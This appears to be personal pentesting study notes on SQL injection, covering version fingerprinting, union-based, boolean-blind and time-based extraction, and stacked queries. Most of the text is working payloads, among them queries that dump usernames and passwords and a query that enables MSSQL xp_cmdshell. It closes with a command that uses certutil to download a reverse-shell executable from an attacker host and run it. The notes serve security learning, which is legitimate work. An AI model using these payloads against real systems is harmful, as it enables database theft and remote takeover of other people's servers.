
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi

Finding the SQL version:

Oracle           `SELECT banner FROM v$version   SELECT version FROM v$instance   `
Microsoft      `SELECT @@version`
PostgreSQL   `SELECT version()`
MySQL          `SELECT @@version`
SQLite           `SELECT sqlite_version()`

### Basics

id=`2;--`
`' OR 1=1 -- -` obs, not safe as all rows are returned/possibly updated

`something we know works' AND 1=1 --` safer alternative


## Three types
- In-Band - same method to retrieve results
	- Error-Based - errors shown on web page
	- Union-Based
- Blind
- Out-of-Band

### In-Band SQLi

In-Band = the same method of communication used to exploit the vulnerability and receive the results

#### Error-Based

Error-Based = the sql errors shown on web page

try adding ' or " to produce an error

#### Union-Based

Union-Based = uses select union queries

union: Combines several select statements, results must have the <u>same number of columns</u> and the data needs to have a similar data type.

try:
`0 union select 1`
`0 union select 1,2`
`0 union select 1,2,3`
until you find the right number of columns

also make sure `0` does not return actual results or you will only see these

then try to get information about the database:
`0 union select 1,2,database()`   database name

<u>list tables</u> in the database `sqli_one`
`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`

<u>list columns</u> in the table `staff_users`
`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`

<u>list the contents</u> of the table `staff_users`
`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`

group_concat()


### Blind SQLi

#### Authentication example

`select * from users where username='%username%' and password='%password%' LIMIT 1;`

`' OR 1=1;--`

#### Boolean based

a create new account form usually check if the username already exists - we can use this to get other information from the database

imagine the sql being:
`select * from users where username = '%username%' LIMIT 1;`
and the check in the background testing if the query failed or succeeded

then we should use this test for true (data returned from the sql statement) or false = no data, an error?, any error?

if we use a non existent username with a union select + something we want to know if it's returning something

`admin123' UNION SELECT 1;--` gives false, since wrong number of columns
`admin123' UNION SELECT 1,2,3;--` gives true

<u>get database name</u>
`admin123' UNION SELECT 1,2,3 where database() like '%';--`  true
`admin123' UNION SELECT 1,2,3 where database() like 's%';--`  true
`admin123' UNION SELECT 1,2,3 where database() like 'sq%';--`  true
`admin123' UNION SELECT 1,2,3 where database() like 'sqw%';--`  false
`admin123' UNION SELECT 1,2,3 where database() like 'sql%';--`  true

<u>get table name</u>
`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'user%';--`

confirm you get the correct name by skipping the like bit like this:
`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--`

<u>get column name</u>
`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`

to not get the same hit twice what automating:
`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`

<u>get data</u> like username and password
`admin123' UNION SELECT 1,2,3 from users where username like 'a%`
`admin123' UNION SELECT 1,2,3 from users where username like 'ad%`

`admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '38%`

#### Time-based

we're getting no output, even true/false, so we delay instead

`admin123' UNION SELECT sleep(5);--` gives no delay, since wrong number of columns
`admin123' UNION SELECT sleep(5),2;--` gives a five sec delay since the table has two columns

We can use all of the same queries as with boolean, only adding sleep(n) as one of the column representations

### Out-of-Band

the data collection method is something totally different than the one launching the attack
for example it can be sent to a http/dns server you control






### Stacked Queries

not available in all  systems

`' ; new query here; --`

# Stored procedures and functions

Procedures and functions within a  database  management system.

MSSQL has **xp_cmdshell** that might be used to execute os calls to get rce (remote code execution). (By using EXECUTE  / EXEC to run windows shell commands!!)

Disabled by default! Still common irl. New secure replacement fir example SSIS (SQL Server Integration Services).
Even when disabled, it can be enabled with an EXEC query if the user has the 'sysadmin' role or have the 'alter settings' server level permission.
`'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --`

# Upload and execute exploit/rev shell

`'; EXEC xp_cmdshell 'certutil -urlcache -f http://10.18.21.236:8000/win64-reverse.exe C:\Windows\Temp\reverse.exe'; --`
`'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --`


